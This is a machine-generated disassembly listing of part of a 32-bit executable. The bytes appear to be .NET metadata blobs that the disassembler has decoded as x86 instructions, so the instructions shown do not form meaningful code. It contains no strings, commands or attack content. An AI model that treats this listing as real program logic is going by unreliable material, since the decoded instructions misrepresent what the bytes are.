  4091d5:	04 00                	add    $0x0,%al
  4091d7:	00 08                	add    %cl,(%eax)
  4091d9:	00 04 00             	add    %al,(%eax,%eax,1)
  4091dc:	00 10                	add    %dl,(%eax)
  4091de:	00 03                	add    %al,(%ebx)
  4091e0:	06                   	push   %es
  4091e1:	11 14 04             	adc    %edx,(%esp,%eax,1)
  4091e4:	00 00                	add    %al,(%eax)
  4091e6:	00 00                	add    %al,(%eax)
  4091e8:	04 c7                	add    $0xc7,%al
  4091ea:	04 00                	add    $0x0,%al
  4091ec:	00 04 20             	add    %al,(%eax,%eiz,1)
  4091ef:	05 00 00 04 90       	add    $0x90040000,%eax
  4091f4:	04 00                	add    $0x0,%al
  4091f6:	00 04 23             	add    %al,(%ebx,%eiz,1)
  4091f9:	05 00 00 04 7a       	add    $0x7a040000,%eax
  4091fe:	00 00                	add    %al,(%eax)
  409200:	00 04 57             	add    %al,(%edi,%edx,2)
  409203:	00 00                	add    %al,(%eax)
  409205:	00 04 ec             	add    %al,(%esp,%ebp,8)
  409208:	03 00                	add    (%eax),%eax
  40920a:	00 03                	add    %al,(%ebx)
  40920c:	06                   	push   %es
  40920d:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  409213:	2d 05 20 01 01       	sub    $0x1012005,%eax
  409218:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  40921e:	31 05 20 01 01 11    	xor    %eax,0x11010120
  409224:	31 04 20             	xor    %eax,(%eax,%eiz,1)
  409227:	00 11                	add    %dl,(%ecx)
  409229:	35 05 20 01 01       	xor    $0x1012005,%eax
  40922e:	11 35 03 20 00 08    	adc    %esi,0x8002003
  409234:	04 20                	add    $0x20,%al
  409236:	01 01                	add    %eax,(%ecx)
  409238:	08 03                	or     %al,(%ebx)
  40923a:	06                   	push   %es
  40923b:	12 15 0c 20 01 14    	adc    0x1401200c,%dl
  409241:	11 39                	adc    %edi,(%ecx)
  409243:	02 00                	add    (%eax),%al
  409245:	02 00                	add    (%eax),%al
  409247:	00 11                	add    %dl,(%ecx)
  409249:	3d 03 20 00 02       	cmp    $0x2002003,%eax
  40924e:	06                   	push   %es
  40924f:	20 01                	and    %al,(%ecx)
  409251:	11 41 11             	adc    %eax,0x11(%ecx)
  409254:	45                   	inc    %ebp
  409255:	0b 20                	or     (%eax),%esp
  409257:	04 01                	add    $0x1,%al
  409259:	11 3d 11 35 11 3d    	adc    %edi,0x3d113511
  40925f:	11 39                	adc    %edi,(%ecx)
  409261:	07                   	pop    %es
  409262:	20 02                	and    %al,(%edx)
  409264:	01 11                	add    %edx,(%ecx)
  409266:	3d 11 39 0d 20       	cmp    $0x200d3911,%eax
  40926b:	02 01                	add    (%ecx),%al
  40926d:	11 35 14 11 39 02    	adc    %esi,0x2391114
  409273:	00 02                	add    %al,(%edx)
  409275:	00 00                	add    %al,(%eax)
  409277:	03 20                	add    (%eax),%esp
  409279:	00 0e                	add    %cl,(%esi)
  40927b:	04 20                	add    $0x20,%al
  40927d:	01 01                	add    %eax,(%ecx)
  40927f:	0e                   	push   %cs
  409280:	04 28                	add    $0x28,%al
  409282:	00 11                	add    %dl,(%ecx)
  409284:	2d 04 28 00 11       	sub    $0x11002804,%eax
  409289:	31 04 28             	xor    %eax,(%eax,%ebp,1)
  40928c:	00 11                	add    %dl,(%ecx)
  40928e:	35 03 28 00 08       	xor    $0x8002803,%eax
  409293:	03 28                	add    (%eax),%ebp
  409295:	00 02                	add    %al,(%edx)
  409297:	03 28                	add    (%eax),%ebp
  409299:	00 0e                	add    %cl,(%esi)
  40929b:	04 00                	add    $0x0,%al
  40929d:	01 18                	add    %ebx,(%eax)
  40929f:	09 09                	or     %ecx,(%ecx)
  4092a1:	00 04 11             	add    %al,(%ecx,%edx,1)
  4092a4:	49                   	dec    %ecx
  4092a5:	0e                   	push   %cs
  4092a6:	0e                   	push   %cs
  4092a7:	10 0e                	adc    %cl,(%esi)
  4092a9:	02 08                	add    (%eax),%cl
  4092ab:	00 03                	add    %al,(%ebx)
  4092ad:	11 49 0e             	adc    %ecx,0xe(%ecx)
  4092b0:	0e                   	push   %cs
  4092b1:	10 0e                	adc    %cl,(%esi)
  4092b3:	0c 00                	or     $0x0,%al
  4092b5:	04 08                	add    $0x8,%al
  4092b7:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  4092bc:	51                   	push   %ecx
  4092bd:	08 0e                	or     %cl,(%esi)
  4092bf:	0e                   	push   %cs
  4092c0:	0b 00                	or     (%eax),%eax
  4092c2:	06                   	push   %es
  4092c3:	08 09                	or     %cl,(%ecx)
  4092c5:	09 1d 05 12 21 08    	or     %ebx,0x8211205
  4092cb:	09 07                	or     %eax,(%edi)
  4092cd:	00 03                	add    %al,(%ebx)
  4092cf:	0e                   	push   %cs
  4092d0:	11 55 02             	adc    %edx,0x2(%ebp)
  4092d3:	02 07                	add    (%edi),%al
  4092d5:	00 03                	add    %al,(%ebx)
  4092d7:	11 41 0e             	adc    %eax,0xe(%ecx)
  4092da:	0e                   	push   %cs
  4092db:	02 02                	add    (%edx),%al
  4092dd:	06                   	push   %es
  4092de:	02 03                	add    (%ebx),%al
  4092e0:	06                   	push   %es
  4092e1:	11 41 06             	adc    %eax,0x6(%ecx)
  4092e4:	20 02                	and    %al,(%edx)
  4092e6:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  4092e9:	59                   	pop    %ecx
  4092ea:	03 06                	add    (%esi),%eax
  4092ec:	12 5d 07             	adc    0x7(%ebp),%bl
  4092ef:	06                   	push   %es
  4092f0:	15 12 61 01 11       	adc    $0x11016112,%eax
  4092f5:	34 08                	xor    $0x8,%al
  4092f7:	b0 3f                	mov    $0x3f,%al
  4092f9:	5f                   	pop    %edi
  4092fa:	7f 11                	jg     0x40930d
  4092fc:	d5 0a                	aad    $0xa
  4092fe:	3a 06                	cmp    (%esi),%al
  409300:	20 01                	and    %al,(%ecx)
  409302:	11 65 11             	adc    %esp,0x11(%ebp)
  409305:	2d 06 20 02 01       	sub    $0x1022006,%eax
  40930a:	0e                   	push   %cs
  40930b:	11 2d 06 20 02 01    	adc    %ebp,0x1022006
  409311:	1c 12                	sbb    $0x12,%al
  409313:	69 07 20 02 01 10    	imul   $0x10010220,(%edi),%eax
  409319:	11 34 08             	adc    %esi,(%eax,%ecx,1)
  40931c:	05 20 01 01 12       	add    $0x12010120,%eax
  409321:	6d                   	insl   (%dx),%es:(%edi)
  409322:	03 06                	add    (%esi),%eax
  409324:	12 71 03             	adc    0x3(%ecx),%dh
  409327:	06                   	push   %es
  409328:	12 75 03             	adc    0x3(%ebp),%dh
  40932b:	06                   	push   %es
  40932c:	12 1c 12             	adc    (%edx,%edx,1),%bl
  40932f:	20 03                	and    %al,(%ebx)
  409331:	15 12 79 02 0e       	adc    $0xe027912,%eax
  409336:	12 7d 0e             	adc    0xe(%ebp),%bh
  409339:	0e                   	push   %cs
  40933a:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  40933f:	80 81 0c 20 04 08 0e 	addb   $0xe,0x804200c(%ecx)
  409346:	0e                   	push   %cs
  409347:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  40934c:	51                   	push   %ecx
  40934d:	08 0d 20 06 12 80    	or     %cl,0x80120620
  409353:	85 0e                	test   %ecx,(%esi)
  409355:	0e                   	push   %cs
  409356:	0e                   	push   %cs
  409357:	0e                   	push   %cs
  409358:	11 25 11 29 09 20    	adc    %esp,0x20092911
  40935e:	04 12                	add    $0x12,%al
  409360:	80 85 0e 0e 0e 0e 04 	addb   $0x4,0xe0e0e0e(%ebp)
  409367:	20 00                	and    %al,(%eax)
  409369:	12 11                	adc    (%ecx),%dl
  40936b:	05 20 00 12 80       	add    $0x80120020,%eax
  409370:	89 08                	mov    %ecx,(%eax)
  409372:	20 03                	and    %al,(%ebx)
  409374:	01 11                	add    %edx,(%ecx)
  409376:	2d 11 2d 0e 03       	sub    $0x30e2d11,%eax
  40937b:	06                   	push   %es
  40937c:	12 30                	adc    (%eax),%dh
  40937e:	06                   	push   %es
  40937f:	20 02                	and    %al,(%edx)
  409381:	01 0a                	add    %ecx,(%edx)
  409383:	12 6d 04             	adc    0x4(%ebp),%ch
  409386:	28 00                	sub    %al,(%eax)
  409388:	12 11                	adc    (%ecx),%dl
  40938a:	03 06                	add    (%esi),%eax
  40938c:	12 44 03 06          	adc    0x6(%ebx,%eax,1),%al
  409390:	12 38                	adc    (%eax),%bh
  409392:	04 06                	add    $0x6,%al
  409394:	12 80 8d 04 06 11    	adc    0x1106048d(%eax),%al
  40939a:	80 91 07 20 02 01 12 	adcb   $0x12,0x1022007(%ecx)
  4093a1:	44                   	inc    %esp
  4093a2:	12 38                	adc    (%eax),%bh
  4093a4:	04 20                	add    $0x20,%al
  4093a6:	00 12                	add    %dl,(%edx)
  4093a8:	7d 03                	jge    0x4093ad
  4093aa:	06                   	push   %es
  4093ab:	12 7d 05             	adc    0x5(%ebp),%bh
  4093ae:	20 00                	and    %al,(%eax)
  4093b0:	12 80 8d 05 20 00    	adc    0x20058d(%eax),%al
  4093b6:	11 80 91 04 20 00    	adc    %eax,0x200491(%eax)
  4093bc:	12 19                	adc    (%ecx),%bl
  4093be:	05 20 00 12 80       	add    $0x80120020,%eax
  4093c3:	95                   	xchg   %eax,%ebp
  4093c4:	04 28                	add    $0x28,%al
  4093c6:	00 12                	add    %dl,(%edx)
  4093c8:	7d 05                	jge    0x4093cf
  4093ca:	28 00                	sub    %al,(%eax)
  4093cc:	12 80 8d 05 28 00    	adc    0x28058d(%eax),%al
  4093d2:	11 80 91 04 28 00    	adc    %eax,0x280491(%eax)
  4093d8:	12 19                	adc    (%ecx),%bl
  4093da:	05 28 00 12 80       	add    $0x80120028,%eax
  4093df:	95                   	xchg   %eax,%ebp
  4093e0:	05 20 01 01 12       	add    $0x12010120,%eax
  4093e5:	38 04 20             	cmp    %al,(%eax,%eiz,1)
  4093e8:	01 01                	add    %eax,(%ecx)
  4093ea:	02 05 00 01 08 1d    	add    0x1d080100,%al
  4093f0:	0e                   	push   %cs
  4093f1:	07                   	pop    %es
  4093f2:	00 02                	add    %al,(%edx)
  4093f4:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  4093f7:	80 99 06 20 01 01 11 	sbbb   $0x11,0x1012006(%ecx)
  4093fe:	80 a1 01 02 01 15 05 	andb   $0x5,0x15010201(%ecx)
  409405:	20 02                	and    %al,(%edx)
  409407:	01 0e                	add    %ecx,(%esi)
  409409:	08 04 00             	or     %al,(%eax,%eax,1)
  40940c:	01 02                	add    %eax,(%edx)
  40940e:	0e                   	push   %cs
  40940f:	06                   	push   %es
  409410:	10 01                	adc    %al,(%ecx)
  409412:	01 08                	add    %ecx,(%eax)
  409414:	1e                   	push   %ds
  409415:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409418:	01 11                	add    %edx,(%ecx)
  40941a:	0c 0f                	or     $0xf,%al
  40941c:	07                   	pop    %es
  40941d:	07                   	pop    %es
  40941e:	12 21                	adc    (%ecx),%ah
  409420:	12 21                	adc    (%ecx),%ah
  409422:	11 0c 02             	adc    %ecx,(%edx,%eax,1)
  409425:	11 10                	adc    %edx,(%eax)
  409427:	11 14 12             	adc    %edx,(%edx,%edx,1)
  40942a:	18 06                	sbb    %al,(%esi)
  40942c:	20 01                	and    %al,(%ecx)
  40942e:	01 11                	add    %edx,(%ecx)
  409430:	80 dd 05             	sbb    $0x5,%ch
  409433:	20 02                	and    %al,(%edx)
  409435:	01 08                	add    %ecx,(%eax)
  409437:	08 04 20             	or     %al,(%eax,%eiz,1)
  40943a:	01 01                	add    %eax,(%ecx)
  40943c:	0d 08 14 11 39       	or     $0x39111408,%eax
  409441:	02 00                	add    (%eax),%al
  409443:	02 00                	add    (%eax),%al
  409445:	00 07                	add    %al,(%edi)
  409447:	20 02                	and    %al,(%edx)
  409449:	10 11                	adc    %dl,(%ecx)
  40944b:	39 08                	cmp    %ecx,(%eax)
  40944d:	08 0b                	or     %cl,(%ebx)
  40944f:	20 04 01             	and    %al,(%ecx,%eax,1)
  409452:	03 11                	add    (%ecx),%edx
  409454:	2d 11 2d 11 80       	sub    $0x80112d11,%eax
  409459:	e9 0c 07 03 14       	jmp    0x14439b6a
  40945e:	11 39                	adc    %edi,(%ecx)
  409460:	02 00                	add    (%eax),%al
  409462:	02 00                	add    (%eax),%al
  409464:	00 08                	add    %cl,(%eax)
  409466:	08 04 07             	or     %al,(%edi,%eax,1)
  409469:	01 11                	add    %edx,(%ecx)
  40946b:	35 04 07 01 11       	xor    $0x11010704,%eax
  409470:	31 05 00 00 12 80    	xor    %eax,0x80120000
  409476:	ed                   	in     (%dx),%eax
  409477:	05 20 02 01 0c       	add    $0xc010220,%eax
  40947c:	0c 06                	or     $0x6,%al
  40947e:	20 01                	and    %al,(%ecx)
  409480:	01 11                	add    %edx,(%ecx)
  409482:	80 f1 06             	xor    $0x6,%cl
  409485:	20 01                	and    %al,(%ecx)
  409487:	01 11                	add    %edx,(%ecx)
  409489:	80 f9 06             	cmp    $0x6,%cl
  40948c:	20 01                	and    %al,(%ecx)
  40948e:	01 11                	add    %edx,(%ecx)
  409490:	81 05 08 00 01 12 81 	addl   $0x80120981,0x12010008
  409497:	09 12 80 
  40949a:	e5 05                	in     $0x5,%eax
  40949c:	20 00                	and    %al,(%eax)
  40949e:	11 81 0d 06 20 01    	adc    %eax,0x120060d(%ecx)
  4094a4:	01 11                	add    %edx,(%ecx)
  4094a6:	81 11 05 20 00 12    	adcl   $0x12002005,(%ecx)
  4094ac:	81 15 06 20 01 01 12 	adcl   $0x7e58012,0x1012006
  4094b3:	80 e5 07 
  4094b6:	20 04 01             	and    %al,(%ecx,%eax,1)
  4094b9:	08 08                	or     %cl,(%eax)
  4094bb:	08 08                	or     %cl,(%eax)
  4094bd:	04 00                	add    $0x0,%al
  4094bf:	01 0e                	add    %ecx,(%esi)
  4094c1:	18 05 20 01 01 11    	sbb    %al,0x11010120
  4094c7:	49                   	dec    %ecx
  4094c8:	05 00 02 08 08       	add    $0x8080200,%eax
  4094cd:	08 07                	or     %al,(%edi)
  4094cf:	20 01                	and    %al,(%ecx)
  4094d1:	01 1d 12 80 e5 06    	add    %ebx,0x6e58012
  4094d7:	20 01                	and    %al,(%ecx)
  4094d9:	01 11                	add    %edx,(%ecx)
  4094db:	81 1d 06 20 01 01 11 	sbbl   $0x5218111,0x1012006
  4094e2:	81 21 05 
  4094e5:	00 00                	add    %al,(%eax)
  4094e7:	12 81 25 06 00 01    	adc    0x1000625(%ecx),%al
  4094ed:	12 81 29 0e 06 20    	adc    0x20060e29(%ecx),%al
  4094f3:	01 01                	add    %eax,(%ecx)
  4094f5:	12 81 29 06 20 01    	adc    0x1200629(%ecx),%al
  4094fb:	01 12                	add    %edx,(%edx)
  4094fd:	81 2d 04 20 00 11 49 	subl   $0xa071a49,0x11002004
  409504:	1a 07 0a 
  409507:	12 15 12 71 12 80    	adc    0x80127112,%dl
  40950d:	fd                   	std
  40950e:	12 81 01 12 81 01    	adc    0x1811201(%ecx),%al
  409514:	0e                   	push   %cs
  409515:	0e                   	push   %cs
  409516:	11 49 11             	adc    %ecx,0x11(%ecx)
  409519:	81 0d 1d 12 80 e5 06 	orl    $0x4d121506,0xe580121d
  409520:	15 12 4d 
  409523:	01 12                	add    %edx,(%edx)
  409525:	51                   	push   %ecx
  409526:	09 20                	or     %esp,(%eax)
  409528:	00 15 12 81 39 01    	add    %dl,0x1398112
  40952e:	13 00                	adc    (%eax),%eax
  409530:	07                   	pop    %es
  409531:	15 12 81 39 01       	adc    $0x1398112,%eax
  409536:	12 51 04             	adc    0x4(%ecx),%dl
  409539:	20 00                	and    %al,(%eax)
  40953b:	13 00                	adc    (%eax),%eax
  40953d:	07                   	pop    %es
  40953e:	20 02                	and    %al,(%edx)
  409540:	01 12                	add    %edx,(%edx)
  409542:	80 e5 0e             	and    $0xe,%ch
  409545:	25 07 0f 12 15       	and    $0x15120f07,%eax
  40954a:	1d 12 81 31 12       	sbb    $0x12318112,%eax
  40954f:	81 35 12 81 01 08 08 	xorl   $0x8711208,0x8018112
  409556:	12 71 08 
  409559:	08 12                	or     %dl,(%edx)
  40955b:	51                   	push   %ecx
  40955c:	08 08                	or     %cl,(%eax)
  40955e:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409564:	15 12 81 39 01       	adc    $0x1398112,%eax
  409569:	12 51 06             	adc    0x6(%ecx),%dl
  40956c:	07                   	pop    %es
  40956d:	02 12                	add    (%edx),%dl
  40956f:	21 1d 05 09 07 03    	and    %ebx,0x3070905
  409575:	12 2c 12             	adc    (%edx,%edx,1),%ch
  409578:	71 11                	jno    0x40958b
  40957a:	81 0d 05 20 02 01 1c 	orl    $0x2006181c,0x1022005
  409581:	18 06 20 
  409584:	01 01                	add    %eax,(%ecx)
  409586:	12 81 49 04 20 00    	adc    0x200449(%ecx),%al
  40958c:	11 55 04             	adc    %edx,0x4(%ebp)
  40958f:	20 01                	and    %al,(%ecx)
  409591:	03 08                	add    (%eax),%ecx
  409593:	04 20                	add    $0x20,%al
  409595:	01 01                	add    %eax,(%ecx)
  409597:	03 06                	add    (%esi),%eax
  409599:	20 01                	and    %al,(%ecx)
  40959b:	01 11                	add    %edx,(%ecx)
  40959d:	81 4d 05 20 00 11 81 	orl    $0x81110020,0x5(%ebp)
  4095a4:	4d                   	dec    %ebp
  4095a5:	04 00                	add    $0x0,%al
  4095a7:	00 11                	add    %dl,(%ecx)
  4095a9:	65 05 00 01 11 65    	gs add $0x65110100,%eax
  4095af:	0e                   	push   %cs
  4095b0:	04 07                	add    $0x7,%al
  4095b2:	01 11                	add    %edx,(%ecx)
  4095b4:	2d 06 15 12 61       	sub    $0x61121506,%eax
  4095b9:	01 11                	add    %edx,(%ecx)
  4095bb:	34 05                	xor    $0x5,%al
  4095bd:	20 01                	and    %al,(%ecx)
  4095bf:	01 11                	add    %edx,(%ecx)
  4095c1:	65 06                	gs push %es
  4095c3:	20 01                	and    %al,(%ecx)
  4095c5:	01 12                	add    %edx,(%edx)
  4095c7:	81 59 05 20 01 13 00 	sbbl   $0x130120,0x5(%ecx)
  4095ce:	08 05 20 00 12 81    	or     %al,0x81120020
  4095d4:	5d                   	pop    %ebp
  4095d5:	09 20                	or     %esp,(%eax)
  4095d7:	02 01                	add    (%ecx),%al
  4095d9:	12 81 5d 11 81 61    	adc    0x6181115d(%ecx),%al
  4095df:	06                   	push   %es
  4095e0:	20 01                	and    %al,(%ecx)
  4095e2:	01 12                	add    %edx,(%edx)
  4095e4:	81 5d 06 20 01 01 11 	sbbl   $0x11010120,0x6(%ebp)
  4095eb:	81 65 05 20 00 11 81 	andl   $0x81110020,0x5(%ebp)
  4095f2:	69 05 20 01 01 13 00 	imul   $0x2200600,0x13010120,%eax
  4095f9:	06 20 02 
  4095fc:	01 08                	add    %ecx,(%eax)
  4095fe:	13 00                	adc    (%eax),%eax
  409600:	06                   	push   %es
  409601:	20 03                	and    %al,(%ebx)
  409603:	01 08                	add    %ecx,(%eax)
  409605:	08 08                	or     %cl,(%eax)
  409607:	03 20                	add    (%eax),%esp
  409609:	00 0d 07 00 04 0e    	add    %cl,0xe040007
  40960f:	0e                   	push   %cs
  409610:	1c 1c                	sbb    $0x1c,%al
  409612:	1c 05                	sbb    $0x5,%al
  409614:	00 02                	add    %al,(%edx)
  409616:	0e                   	push   %cs
  409617:	0e                   	push   %cs
  409618:	0e                   	push   %cs
  409619:	03 00                	add    (%eax),%eax
  40961b:	00 01                	add    %al,(%ecx)
  40961d:	2d 07 14 08 08       	sub    $0x8081407,%eax
  409622:	08 11                	or     %dl,(%ecx)
  409624:	34 08                	xor    $0x8,%al
  409626:	08 08                	or     %cl,(%eax)
  409628:	08 08                	or     %cl,(%eax)
  40962a:	11 81 71 11 81 0d    	adc    %eax,0xd811171(%ecx)
  409630:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409636:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  40963c:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409642:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409648:	11 81 0d 06 00 02    	adc    %eax,0x200060d(%ecx)
  40964e:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409651:	0e                   	push   %cs
  409652:	07                   	pop    %es
  409653:	15 12 79 02 0e       	adc    $0xe027912,%eax
  409658:	12 7d 07             	adc    0x7(%ebp),%bh
  40965b:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409660:	80 81 08 15 12 81 39 	addb   $0x39,-0x7eedeaf8(%ecx)
  409667:	01 12                	add    %edx,(%edx)
  409669:	80 81 08 00 01 12 81 	addb   $0x81,0x12010008(%ecx)
  409670:	81 11 81 85 06 00    	adcl   $0x68581,(%ecx)
  409676:	01 12                	add    %edx,(%edx)
  409678:	81 81 0e 05 20 00 12 	addl   $0x6818112,0x20050e(%ecx)
  40967f:	81 81 06 
  409682:	00 03                	add    %al,(%ebx)
  409684:	0e                   	push   %cs
  409685:	0e                   	push   %cs
  409686:	0e                   	push   %cs
  409687:	0e                   	push   %cs
  409688:	09 20                	or     %esp,(%eax)
  40968a:	01 12                	add    %edx,(%edx)
  40968c:	81 81 1d 12 81 81 05 	addl   $0x121d0605,-0x7e7eede3(%ecx)
  409693:	06 1d 12 
  409696:	81 81 13 20 04 12 81 	addl   $0x81118d81,0x12042013(%ecx)
  40969d:	8d 11 81 
  4096a0:	91                   	xchg   %eax,%ecx
  4096a1:	12 81 95 1d 12 81    	adc    -0x7eede26b(%ecx),%al
  4096a7:	81 1d 11 81 99 05 20 	sbbl   $0x1d1c0120,0x5998111
  4096ae:	01 1c 1d 
  4096b1:	1c 06                	sbb    $0x6,%al
  4096b3:	00 03                	add    %al,(%ebx)
  4096b5:	0e                   	push   %cs
  4096b6:	0e                   	push   %cs
  4096b7:	1c 1c                	sbb    $0x1c,%al
  4096b9:	07                   	pop    %es
  4096ba:	00 02                	add    %al,(%edx)
  4096bc:	1c 1c                	sbb    $0x1c,%al
  4096be:	12 81 81 0d 20 05    	adc    0x5200d81(%ecx),%al
  4096c4:	1c 0e                	sbb    $0xe,%al
  4096c6:	11 81 91 12 81 95    	adc    %eax,-0x6a7eed6f(%ecx)
  4096cc:	1c 1d                	sbb    $0x1d,%al
  4096ce:	1c 04                	sbb    $0x4,%al
  4096d0:	20 01                	and    %al,(%ecx)
  4096d2:	01 1c 07             	add    %ebx,(%edi,%eax,1)
  4096d5:	20 02                	and    %al,(%edx)
  4096d7:	01 13                	add    %edx,(%ebx)
  4096d9:	00 13                	add    %dl,(%ebx)
  4096db:	01 09                	add    %ecx,(%ecx)
  4096dd:	00 02                	add    %al,(%edx)
  4096df:	02 12                	add    (%edx),%dl
  4096e1:	81 81 12 81 81 05 00 	addl   $0xe0e0200,0x5818112(%ecx)
  4096e8:	02 0e 0e 
  4096eb:	1c 05                	sbb    $0x5,%al
  4096ed:	00 02                	add    %al,(%edx)
  4096ef:	02 0e                	add    (%esi),%cl
  4096f1:	0e                   	push   %cs
  4096f2:	3e 07                	ds pop %es
  4096f4:	17                   	pop    %ss
  4096f5:	0e                   	push   %cs
  4096f6:	0e                   	push   %cs
  4096f7:	15 12 79 02 0e       	adc    $0xe027912,%eax
  4096fc:	12 7d 12             	adc    0x12(%ebp),%bh
  4096ff:	80 81 12 81 81 12 81 	addb   $0x81,0x12818112(%ecx)
  409706:	81 12 81 81 12 81    	adcl   $0x81128181,(%edx)
  40970c:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  40970f:	0e                   	push   %cs
  409710:	1c 12                	sbb    $0x12,%al
  409712:	81 a5 12 81 a1 1c 0e 	andl   $0x8580120e,0x1ca18112(%ebp)
  409719:	12 80 85 
  40971c:	12 80 89 12 81 a5    	adc    -0x5a7eed77(%eax),%al
  409722:	15 12 81 39 01       	adc    $0x1398112,%eax
  409727:	12 80 81 03 1d 12    	adc    0x121d0381(%eax),%al
  40972d:	81 81 1d 1c 03 07 01 	addl   $0x20040801,0x7031c1d(%ecx)
  409734:	08 04 20 
  409737:	00 1d 03 07 20 02    	add    %bl,0x2200703
  40973d:	01 0e                	add    %ecx,(%esi)
  40973f:	12 80 89 0b 07 05    	adc    0x5070b89(%eax),%al
  409745:	12 18                	adc    (%eax),%bl
  409747:	12 80 89 03 1d 03    	adc    0x31d0389(%eax),%al
  40974d:	08 03                	or     %al,(%ebx)
  40974f:	07                   	pop    %es
  409750:	01 0e                	add    %ecx,(%esi)
  409752:	06                   	push   %es
  409753:	00 01                	add    %al,(%ecx)
  409755:	11 81 ad 02 05 20    	adc    %eax,0x200502ad(%ecx)
  40975b:	00 11                	add    %dl,(%ecx)
  40975d:	81 b1 04 00 01 01 0e 	xorl   $0x20030e,0x1010004(%ecx)
  409764:	03 20 00 
  409767:	03 08                	add    (%eax),%ecx
  409769:	07                   	pop    %es
  40976a:	02 12                	add    (%edx),%dl
  40976c:	80 89 11 81 ad 09 07 	orb    $0x7,0x9ad8111(%ecx)
  409773:	05 12 80 89 0e       	add    $0xe898012,%eax
  409778:	03 0e                	add    (%esi),%ecx
  40977a:	08 05 00 00 12 81    	or     %al,0x81120000
  409780:	b5 05                	mov    $0x5,%ch
  409782:	00 00                	add    %al,(%eax)
  409784:	11 80 91 05 00 01    	adc    %eax,0x1000591(%eax)
  40978a:	12 7d 1c             	adc    0x1c(%ebp),%bh
  40978d:	04 07                	add    $0x7,%al
  40978f:	01 12                	add    %edx,(%edx)
  409791:	7d 04                	jge    0x409797
  409793:	06                   	push   %es
  409794:	12 81 c1 07 20 02    	adc    0x22007c1(%ecx),%al
  40979a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40979d:	81 c5 06 20 01 01    	add    $0x1012006,%ebp
  4097a3:	12 81 c9 08 15 12    	adc    0x121508c9(%ecx),%al
  4097a9:	81 cd 01 12 81 d1    	or     $0xd1811201,%ebp
  4097af:	05 20 00 12 81       	add    $0x81120020,%eax
  4097b4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4097b5:	07                   	pop    %es
  4097b6:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  4097bb:	12 7d 06             	adc    0x6(%ebp),%bh
  4097be:	20 01                	and    %al,(%ecx)
  4097c0:	01 12                	add    %edx,(%edx)
  4097c2:	81 d9 07 00 01 12    	sbb    $0x12010007,%ecx
  4097c8:	81 e1 12 1d 06 20    	and    $0x20061d12,%ecx
  4097ce:	01 01                	add    %eax,(%ecx)
  4097d0:	11 81 e5 05 00 00    	adc    %eax,0x5e5(%ecx)
  4097d6:	12 81 e9 06 20 01    	adc    0x12006e9(%ecx),%al
  4097dc:	01 12                	add    %edx,(%edx)
  4097de:	81 e1 05 20 00 12    	and    $0x12002005,%ecx
  4097e4:	81 ed 0a 20 00 15    	sub    $0x1500200a,%ebp
  4097ea:	12 81 cd 01 12 81    	adc    -0x7eedfe33(%ecx),%al
  4097f0:	d1 08                	rorl   $1,(%eax)
  4097f2:	15 12 81 f1 01       	adc    $0x1f18112,%eax
  4097f7:	12 81 c5 0b 20 01    	adc    0x1200bc5(%ecx),%al
  4097fd:	01 15 12 81 f1 01    	add    %edx,0x1f18112
  409803:	12 81 c5 06 15 12    	adc    0x121506c5(%ecx),%al
  409809:	81 cd 01 0e 03 00    	or     $0x30e01,%ebp
  40980f:	00 02                	add    %al,(%edx)
  409811:	03 00                	add    (%eax),%eax
  409813:	00 0e                	add    %cl,(%esi)
  409815:	06                   	push   %es
  409816:	00 03                	add    %al,(%ebx)
  409818:	08 0e                	or     %cl,(%esi)
  40981a:	0e                   	push   %cs
  40981b:	02 07                	add    (%edi),%al
  40981d:	20 02                	and    %al,(%edx)
  40981f:	02 0e                	add    (%esi),%cl
  409821:	11 81 f5 0a 20 03    	adc    %eax,0x3200af5(%ecx)
  409827:	1d 0e 1d 0e 08       	sbb    $0x80e1d0e,%eax
  40982c:	11 81 f9 0c 00 04    	adc    %eax,0x4000cf9(%ecx)
  409832:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409835:	0e                   	push   %cs
  409836:	11 81 fd 11 82 01    	adc    %eax,0x18211fd(%ecx)
  40983c:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  409841:	03 06                	add    (%esi),%eax
  409843:	20 01                	and    %al,(%ecx)
  409845:	12 82 09 0e 05 00    	adc    0x50e09(%edx),%al
  40984b:	00 12                	add    %dl,(%edx)
  40984d:	82 0d 09 20 02 01 12 	orb    $0x12,0x1022009
  409854:	82 09 12             	orb    $0x12,(%ecx)
  409857:	82 0d 05 00 02 01 0e 	orb    $0xe,0x1020005
  40985e:	0e                   	push   %cs
  40985f:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  409864:	0e                   	push   %cs
  409865:	06                   	push   %es
  409866:	20 01                	and    %al,(%ecx)
  409868:	12 81 e9 0e 06 20    	adc    0x20060ee9(%ecx),%al
  40986e:	01 12                	add    %edx,(%edx)
  409870:	82 21 0e             	andb   $0xe,(%ecx)
  409873:	05 20 00 12 82       	add    $0x82120020,%eax
  409878:	29 06                	sub    %eax,(%esi)
  40987a:	00 02                	add    %al,(%edx)
  40987c:	02 0e                	add    (%esi),%cl
  40987e:	10 0d 06 20 01 12    	adc    %cl,0x12012006
  409884:	82 25 08 07 20 02 12 	andb   $0x12,0x2200708
  40988b:	81 e9 0e 1c 06 20    	sub    $0x20061c0e,%ecx
  409891:	01 12                	add    %edx,(%edx)
  409893:	81 e9 1c 1b 30 02    	sub    $0x2301b1c,%ecx
  409899:	05 12 81 c9 15       	add    $0x15c98112,%eax
  40989e:	12 81 cd 01 1e 00    	adc    0x1e01cd(%ecx),%al
